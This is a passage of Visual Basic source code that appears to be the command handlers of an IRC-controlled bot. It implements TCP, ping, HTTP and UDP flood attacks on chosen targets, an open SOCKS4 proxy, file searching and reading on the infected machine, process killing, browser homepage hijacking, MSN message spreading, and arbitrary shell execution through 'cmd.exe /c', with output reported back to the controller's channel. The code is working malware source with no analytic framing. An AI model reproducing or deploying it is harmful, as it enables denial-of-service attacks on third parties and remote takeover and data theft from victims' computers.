                Case "target", "t"
                    TCP.Hostname = .strParamData(i)
                Case "port", "p"
                    TCP.Ports = .strParamData(i)
                Case "packetsize", "ps"
                    TCP.PacketSize = Val(.strParamData(i))
                Case "timeout", "to"
                    TCP.Timeout = Val(.strParamData(i))
                Case "threads", "th"
                    TCP.Threads = Val(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "TCP")
                    Exit Sub
            End Select
        Next
    End With
        
    With TCP
        .BeginDate = Now
        .IP = ""
        
        If .Timeout = 0 Then
            .Timeout = 15
        End If
        
        If .DateType = vbNullString Or .Duration < 1 Or .Hostname = vbNullString Or .Threads < 1 Or Len(TCP.Ports) < 1 Then
            Call InsuffParams(Index, "TCP")
            Exit Sub
        End If
    
        If IsIP(.Hostname) = False Then
            .IP = NameToAddress(.Hostname)
        Else
            .IP = .Hostname
        End If
        
        If .IP = vbNullString Then
            MsgChan ("Error: TCP Flood: Couldn't resolve " & .Hostname & " to an IP address"), Index
            Exit Sub
        End If
    
        MsgChan "Starting TCP flood: " & .Hostname & "(" & .IP & ")", Index
        Call BeginTCPFlood
    End With
End Sub

Private Sub CmdPing(Index As Long)
    Dim i As Long
    
    If Ping.Flooding Then Exit Sub
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "datetype", "dt"
                    Ping.DateType = .strParamData(i)
                Case "duration", "du"
                    Ping.Duration = Val(.strParamData(i))
                Case "target", "t"
                    Ping.Hostname = .strParamData(i)
                Case "packetsize", "p"
                    Ping.PingSize = Val(.strParamData(i))
                Case "threads", "th"
                    Ping.Threads = Val(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "PING")
                    Exit Sub
            End Select
        Next
    End With
    With Ping
        .BeginDate = Now
        If .PingSize < 1 Or .PingSize > 65500 Then
            MsgChan "Error: invalid ping size!", Index
            Exit Sub
        End If
        If Len(.DateType) = 0 Or .Duration < 1 Or Len(.Hostname) = 0 Or .Threads < 1 Then
            Call InsuffParams(Index, "PING")
            Exit Sub
        End If
        
        If IsIP(.Hostname) = False Then
            .IP = NameToAddress(.Hostname)
        Else
            .IP = .Hostname
        End If
        If .IP = vbNullString Then
            MsgChan ("Error: Ping Flood: Couldn't resolve " & .Hostname & " to IP"), Index
            Exit Sub
        End If
        
        MsgChan "Starting Ping flood: " & .Hostname & "(" & .IP & ")", Index
        Call BeginPingFlood
    End With
End Sub

Private Sub CmdHTTP(Index As Long)
    Dim i As Long
    
    If HTTP.Flooding Then Exit Sub
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "datetype", "dt"
                    HTTP.DateType = .strParamData(i)
                Case "duration", "du"
                    HTTP.Duration = Val(.strParamData(i))
                Case "url", "u", "target"
                    HTTP.URL = .strParamData(i)
                Case "port", "p"
                    HTTP.Port = .strParamData(i)
                Case "threads", "t"
                    HTTP.Threads = Val(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "HTTP")
                    Exit Sub
            End Select
        Next
    End With

    HTTP.BeginDate = Now
    
    If Len(HTTP.Port) = 0 Then HTTP.Port = "80"
    
    If Len(HTTP.DateType) = 0 Or HTTP.Duration < 1 Or Len(HTTP.URL) = 0 Or HTTP.Threads < 1 Then
        Call InsuffParams(Index, "HTTP")
        Exit Sub
    End If
    
    MsgChan "[HTTP] Starting HTTP flood: " & HTTP.URL, Index
    
    Call BeginHTTPFlood
End Sub

Private Sub CmdUDP(Index As Long)
    Dim i As Long
    
    If UDP.Flooding Then Exit Sub
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "datetype", "dt"
                    UDP.DateType = .strParamData(i)
                Case "duration", "du"
                    UDP.Duration = Val(.strParamData(i))
                Case "target", "t"
                    UDP.Hostname = .strParamData(i)
                Case "port", "p"
                    UDP.Port = .strParamData(i)
                Case "packetsize", "ps"
                    UDP.PacketSize = Val(.strParamData(i))
                Case "interval", "i"
                    UDP.Delay = Val(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "UDP")
                    Exit Sub
            End Select
        Next
    End With
        
    With UDP
        .BeginDate = Now
        .IP = ""
        
        If Len(.DateType) = 0 Or .Duration = 0 Or Len(.Hostname) = 0 Then
            Call InsuffParams(Index, "UDP")
            Exit Sub
        End If
        If .PacketSize < 1 Or .PacketSize > 65507 Then
            MsgChan "Error: bad packet size!", Index
            Exit Sub
        End If
        
        If IsIP(.Hostname) = False Then
            .IP = NameToAddress(.Hostname)
        Else
            .IP = .Hostname
        End If
        If .IP = vbNullString Then
            MsgChan ("Error: UDP Flood: Couldn't resolve " & .Hostname & " to IP"), Index
            Exit Sub
        End If
        
        MsgChan "Starting UDP flood: " & .Hostname & "(" & .IP & ")", Index
        Call BeginUDPFLood
    End With
End Sub

Private Sub CmdSocks4(Index As Long)
    Dim strPort As String
    Dim blnStop As Boolean
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "start"
                    blnStop = False
                Case "stop"
                    blnStop = True
                Case "port"
                    strPort = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "SOCKS4")
                    Exit Sub
            End Select
        Next
    End With
    
    If blnStop = True Then
        If frmMain.ctlSox4.Running = True Then
            frmMain.ctlSox4.StopServer
            Call MsgChan("[SOCKS4] Server stopped.", Index)
        End If
    Else
        If Len(strPort) > 0 Then frmMain.ctlSox4.ListenPort = strPort
        If frmMain.ctlSox4.Running = False Then
            frmMain.ctlSox4.StartServer
            Call MsgChan("[SOCKS4] Server started on port " & frmMain.ctlSox4.ListenPort, Index)
        End If
    End If
End Sub

Private Sub CmdFileSearch(Index As Long)
    Dim strSearch As String
    Dim strRoot As String
    Dim blnRecurse As Boolean
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "recurse", "r"
                    blnRecurse = True
                Case "root", "r"
                    strRoot = .strParamData(i)
                Case "search", "s"
                    strSearch = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "FILESEARCH")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strRoot) = 0 Or Len(strSearch) = 0 Then
        Call InsuffParams(Index, "FILESEARCH")
        Exit Sub
    End If
    
    Dim lngFileCount As Long
    Dim strFiles() As String
    
    Call SearchForFiles(strRoot, strSearch, blnRecurse, strFiles, lngFileCount)
    If lngFileCount > 0 Then
        Call MsgChan("[FILESEARCH]: " & lngFileCount & " file(s) found:", Index)
        For i = 0 To lngFileCount - 1
            Call MsgChan(strFiles(i) & " (" & Round(FileLen(strFiles(i)) / 1024, 2) & " kb)", Index)
        Next
    Else
        Call MsgChan("[FILESEARCH]: No results were found.", Index)
    End If
End Sub

Private Sub CmdReadFile(Index As Long)
    Dim strPath As String
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "path", "p"
                    strPath = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "READFILE")
                    Exit Sub
            End Select
        Next
    End With
    
    If FileExists(strPath) Then
        Call MsgChan("[READFILE]: Displaying contents of " & strPath & " (" & Round(FileLen(strPath) / 1024, 2) & " kb):", Index)
    
        Dim intFileHandle As Integer
        Dim strLine As String
        intFileHandle = FreeFile
        Open strPath For Input As #intFileHandle
        While Not EOF(intFileHandle)
            Line Input #intFileHandle, strLine
            If Len(strLine) > 0 Then
                Call MsgChan(strLine, Index)
            End If
        Wend
        
        Call MsgChan("[READFILE]: EOF.", Index)
    Else
        Call MsgChan("[READFILE]: File not found.", Index)
    End If
    
End Sub

Private Sub CmdMSNAdd(Index As Long)
    Dim i As Long
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "contact", "c"
                    MSNAddContact (.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "MSNADD")
                    Exit Sub
            End Select
        Next
    End With
End Sub

Private Sub CmdMSNSend(Index As Long)
    Dim i As Long
    Dim strContact As String
    Dim strMessage As String
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "contact", "c"
                    strContact = .strParamData(i)
                Case "message", "m"
                    strMessage = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "MSNSEND")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strContact) = 0 Or Len(strMessage) = 0 Then
        Call InsuffParams(Index, "MSNSEND")
        Exit Sub
    End If
    
    Call SendMSNSingle(strContact, strMessage)
End Sub

Private Sub CmdKill(Index As Long)
    On Local Error Resume Next
    Dim i As Long
    Dim strExeName As String
    Dim lngPID As Long
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "exename", "e"
                    strExeName = .strParamData(i)
                Case "pid"
                    If IsNumeric(.strParamData(i)) Then lngPID = CLng(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "KILL")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strExeName) > 0 Then
        Call KillSingleProcess(strExeName)
    End If
    If lngPID > 0 Then
        Call KillProcess(lngPID)
    End If
End Sub

Private Sub CmdProcList(Index As Long)
    Dim strProcesses() As String
    Dim lngPIDs() As Long
    Dim lngCount As Long
    Dim i As Long
    Call ListProcesses(strProcesses, lngPIDs, lngCount)
    For i = 0 To lngCount - 1
        Call MsgChan(lngPIDs(i) & " - " & strProcesses(i), Index)
    Next
End Sub

Private Sub CmdAutohomepage(Index As Long)
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "enable"
                    AutoHomepage.Enabled = True
                    Call SaveSetting("autohp.Enabled", CStr(AutoHomepage.Enabled))
                Case "disable"
                    AutoHomepage.Enabled = False
                    Call SaveSetting("autohp.Enabled", CStr(AutoHomepage.Enabled))
                Case "url", "u"
                    AutoHomepage.URL = .strParamData(i)
                    Call SaveSetting("autohp.URL", AutoHomepage.URL)
                Case "interval", "i"
                    AutoHomepage.Interval = .strParamData(i)
                    Call SaveSetting("autohp.Interval", AutoHomepage.Interval)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "AUTOHOMEPAGE")
                    Exit Sub
            End Select
        Next
    End With
End Sub

Private Sub CmdHomepage(Index As Long)
    On Local Error Resume Next
    Dim i As Long
    Dim strURL As String
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "url", "u"
                    strURL = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "HOMEPAGE")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strURL) > 0 Then
        SetIEHomepage (strURL)
        SetFFHomepage (strURL)
    End If
    Dim strIEHomepage As String
    Dim strFFHomepage As String
    strIEHomepage = GetIEHomepage
    strFFHomepage = GetFFHomepage
    If Len(strIEHomepage) > 0 Then Call MsgChan("IE Homepage: " & strIEHomepage, Index)
    If Len(strFFHomepage) > 0 Then Call MsgChan("FF Homepage: " & strFFHomepage, Index)
End Sub

Private Sub CmdCmd(Index As Long)
    Dim i As Long
    Dim strCmd As String
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "command", "c"
                    strCmd = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "CMD")
                    Exit Sub
            End Select
        Next
    End With
    MsgChan ExecuteCommand("cmd.exe /c " & strCmd), Index
End Sub

Private Sub CmdDriveInfo(Index As Long)
    Dim lngUsed As Long
    Dim lngFree As Long
    Dim lngSize As Long
    Dim strFileSystem As String, strDriveType As String
    Dim strDrive As String
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "drive", "dr"
                    strDrive = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "HDINFO")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strDrive) = 0 Then
        Call InsuffParams(Index, "DRIVEINFO")
        Exit Sub
    End If
    
    Call GetDiskSize(strDrive, lngSize, lngFree, lngUsed)
    
    strFileSystem = GetFileSystem(strDrive)
    strDriveType = GetDriveType(strDrive)
    MsgChan ("[DRIVEINFO]: " & strDrive & " [" & strDriveType & "] - File System: " & strFileSystem & ", Size: " & Round(lngSize / 1024, 2) & "GB, Used: " & Round(lngUsed / 1024, 2) & "GB, Availible: " & Round(lngFree / 1024, 2) & "GB"), Index
End Sub

Private Sub CmdFindProxy(Index As Long)
    Dim i As Long
    Dim strHost As String
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "host", "h"
                    strHost = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "FINDPROXY")
                    Exit Sub
            End Select
        Next
    End With
    
    If LCase$(Client.RealHost) Like strHost And Not IsNetworkIP(Client.LocalIP) Then
        Call MsgChan("[FINDPROXY]: " & Client.RealIP & " (" & Client.RealHost & ")", Index)
    End If
End Sub

Private Sub CmdNick(Index As Long)
    Dim strNewNick As String
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "nick", "n"
                    strNewNick = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "NICK")
            End Select
        Next
    End With
    
    If Len(strNewNick) = 0 Then
        Call InsuffParams(Index, "NICK")
    Else
        '[NICK]
        IRCSendData "N " & strNewNick
    End If
End Sub

Private Sub CmdResolve(Index As Long)
    Dim strHost As String
    Dim strIP As String
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "hostname", "host", "h"
                    strHost = .strParamData(i)
                Case "ip"
                    strIP = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "RESOLVE")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strHost) <> 0 Then
        MsgChan "[RESOLVE] " & strHost & " = " & NameToAddress(strHost), Index
    ElseIf Len(strIP) <> 0 Then
        If IsIP(strIP) Then
            MsgChan "[RESOLVE] " & strIP & " = " & AddressToName(strIP), Index
        Else
            MsgChan "[RESOLVE][ERROR]: " & strIP & " is not a valid IP address", Index
        End If
    Else
        Call InsuffParams(Index, "RESOLVE")
    End If
End Sub

Private Sub CmdListDrives(Index As Long)
    Dim strDrives As String
    Dim i As Long
    
    For i = 0 To frmMain.Drives.ListCount
        If Len(frmMain.Drives.List(i)) > 0 Then
            If Len(strDrives) > 0 Then
                strDrives = strDrives & ", " & frmMain.Drives.List(i)
            Else
                strDrives = frmMain.Drives.List(i)
            End If
        End If
    Next
    
    MsgChan "Drives: " & strDrives, Index
End Sub

Private Sub CmdEcho(Index As Long)
    Dim i As Long
    Dim strEcho As String
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "echo", "e"
                    strEcho = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "ECHO")
                    Exit Sub
            End Select
        Next
    End With
    
    MsgChan strEcho, Index
End Sub

Private Sub CmdA(Index As Long)
    Dim i As Long
    Dim strTime As String
    Dim lngDuration As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "a"
                    strTime = .strParamData(i)
                Case "b"
                    lngDuration = CLng(.strParamData(i))
            End Select
        Next
    End With
    
    If DateDiff("d", strTime, Now) >= lngDuration Then MsgChan Now, Index
End Sub
